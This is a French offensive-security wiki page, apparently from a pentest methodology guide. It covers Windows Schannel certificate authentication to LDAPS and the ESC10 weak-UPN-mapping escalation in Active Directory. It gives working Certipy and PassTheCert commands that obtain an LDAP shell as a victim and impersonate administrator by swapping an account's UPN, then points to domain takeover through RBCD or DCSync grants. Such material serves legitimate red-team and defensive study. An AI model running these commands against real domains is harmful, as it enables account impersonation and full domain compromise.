---
order: 6
title: "Schannel : s'authentifier avec un certificat via TLS"
description: "Utiliser un certificat pour s'authentifier via Windows Schannel (TLS) vers LDAPS plutôt que via Kerberos PKINIT, le chemin qui compte lorsque PKINIT est indisponible ou lorsqu'un mappage de certificat Schannel faible (ESC10) permet à un certificat d'usurper un autre compte."
keywords:
  - Schannel
  - PassTheCert
  - LDAPS
  - ESC10
  - certificate mapping
---

# Schannel

PKINIT est la manière Kerberos de transformer un [certificat](theft-and-pass-the-certificate.md) en accès, mais ce n'est pas la seule. **Schannel** est le fournisseur TLS de Windows, et il réalise une **authentification client basée sur certificat** pour les services TLS, le plus utilement **LDAPS**. Ainsi, un certificat que vous détenez ou avez forgé peut être présenté lors d'une poignée de main LDAPS/TLS pour s'authentifier en tant que son sujet, sans aucun Kerberos impliqué. Cela compte dans deux cas : lorsque **PKINIT est indisponible** (pas de certificat KDC sur le DC, ou PKINIT bloqué), et lorsque le **mappage de certificat de Schannel est faible** ([ESC10](certificate-mapping.md)).

## S'authentifier via Schannel

```bash
# Certipy: authenticate with a PFX to LDAPS via Schannel (not PKINIT) and get an LDAP shell
certipy auth -pfx victim.pfx -ldap-shell -dc-ip <dc>

# PassTheCert: authenticate to LDAP/S with a certificate through Schannel, then act over LDAP
passthecert.py -action ldap-shell -crt victim.crt -key victim.key -domain example.local -dc-ip <dc>
```

Depuis un shell LDAP, vous effectuez les écritures d'annuaire habituelles en tant que le principal authentifié : définir du RBCD, ajouter un ordinateur, accorder un DCSync, ou réinitialiser un mot de passe.

## L'angle ESC10

ESC10 est le **mappage de certificat Schannel faible** : sur le serveur réalisant l'authentification Schannel (un DC pour LDAPS), la valeur de registre `CertificateMappingMethods` inclut le mappage par UPN (bit `0x4`), de sorte qu'un certificat est associé à un compte par son **UPN** plutôt que par la liaison SID forte. Le chemin nécessite le contrôle d'un **compte intermédiaire pouvant s'inscrire** : définissez le `userPrincipalName` de ce compte sur celui de la cible, inscrivez un certificat tant que l'UPN correspond, rétablissez l'UPN, puis authentifiez-vous en tant que la cible **via Schannel** (là où PKINIT serait refusé) :

```bash
# Point the intermediary's UPN at the target, enroll, then revert the UPN
certipy account update -user puppet -upn administrator@example.local -dc-ip <dc>
certipy req -ca <CA> -template User -username puppet@example.local -password <pw>
certipy account update -user puppet -upn puppet@example.local -dc-ip <dc>
# Authenticate over Schannel, because the weak UPN mapping only applies there
certipy auth -pfx administrator.pfx -ldap-shell -dc-ip <dc>
```

Il s'agit de la chaîne ESC10 basée sur l'UPN ; écrire l'`altSecurityIdentities` d'une cible est un chemin différent, à mappage explicite, et non un prérequis ici.

## Notes d'exploitation

- Schannel est le **repli qui maintient l'accès par certificat fonctionnel** là où PKINIT ne l'est pas, recourez donc à `-ldap-shell` / PassTheCert lorsque `certipy auth` via PKINIT échoue.
- ESC10 est spécifiquement une faiblesse de mappage **Schannel**, l'usurpation ne fonctionne donc que via Schannel/LDAPS, pas via Kerberos ; c'est pourquoi l'outillage force le chemin LDAPS.
- Le **channel binding (EPA)** de LDAPS détermine si une authentification relayée atteint Schannel LDAPS ; c'est le même contrôle qui borne le [relais NTLM](../ntlm/relay.md) vers LDAPS.
- Un shell LDAP suffit à une prise de contrôle du domaine (RBCD, octroi de DCSync), un accès Schannel à LDAPS en tant que principal privilégié vaut donc PKINIT.

## Outils

- **Certipy** (`auth -ldap-shell`) : authentification Schannel LDAPS avec un PFX.
- **PassTheCert** (AlmondOffSec) : s'authentifier à LDAP/S avec un certificat via Schannel.

## Références

- [PassTheCert (AlmondOffSec)](https://github.com/AlmondOffSec/PassTheCert)
- [SpecterOps: ESC10, Schannel weak certificate mapping](https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc10-schannel-weak-certificate-mapping)
- [HackTricks: AD CS domain escalation (ESC10/Schannel)](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)
